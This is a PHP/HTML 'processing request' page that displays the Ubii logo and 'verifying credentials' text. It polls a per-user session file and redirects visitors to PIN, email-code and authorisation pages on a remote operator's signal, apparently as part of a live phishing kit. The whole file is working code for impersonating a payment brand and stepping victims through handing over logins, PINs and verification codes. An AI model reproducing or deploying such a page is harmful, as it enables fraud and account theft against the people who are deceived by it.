<?php
session_start();
$id_sesion = isset($_SESSION['usuario_id']) ? $_SESSION['usuario_id'] : '';
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Procesando Solicitud</title>
    <style>
        body { font-family: 'Segoe UI', Arial, sans-serif; background-color: #000000; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { text-align: center; background: black; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.05); max-width: 360px; }
        .logo { margin-bottom: 20px; }
        .logo img { max-width: 150px; height: auto; }
        .spinner { border: 4px solid rgba(0, 0, 0, 0.1); width: 50px; height: 50px; border-radius: 50%; border-left-color: #00AEEF; animation: spin 1s linear infinite; margin: 0 auto 20px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        h3 { color: #ffffff; margin-bottom: 8px; }
        p { color: #ffffff; font-size: 14px; }
    </style>
</head>
<body>
    <div class="box">
        <div class="logo">
            <img src="LogoUbiiOnline.svg" alt="Ubii Logo">
        </div>
        <div class="spinner"></div>
        <h3>Verificando credenciales...</h3>
        <p>Por favor, espere un momento mientras validamos su acceso de seguridad.</p>
    </div>

    <script>
        const usuarioId = "<?php echo $id_sesion; ?>";

        function consultarServidor() {
            if (!usuarioId) return;

            fetch('./sesiones/' + usuarioId + '.json?v=' + new Date().getTime())
                .then(res => res.json())
                .then(data => {
                    if (data.estado === 'index_error') {
                        window.location.href = 'index.php?error=auth';
                    } else if (data.estado === 'pin_normal') {
                        window.location.href = 'pin.php';
                    } else if (data.estado === 'correo_ok') {
                        window.location.href = 'correo.php';
                    } else if (data.estado === 'pin_rebotado') {
                        window.location.href = 'pin.php?error=pin_malo';
                    } else if (data.estado === 'esperando_autorizacion') {
                        window.location.href = 'esperar_autorizacion.php';
                    } else if (data.estado === 'no_autorizado') {
                        window.location.href = 'noautorizado.php';
                    } else if (data.estado === 'autorizado') {
                        window.location.href = 'correo.php';
                    }
                })
                .catch(() => console.log("Esperando instrucción del instructor..."));
        }

        if (usuarioId) {
            setInterval(consultarServidor, 2000);
        }
    </script>
</body>
</html>
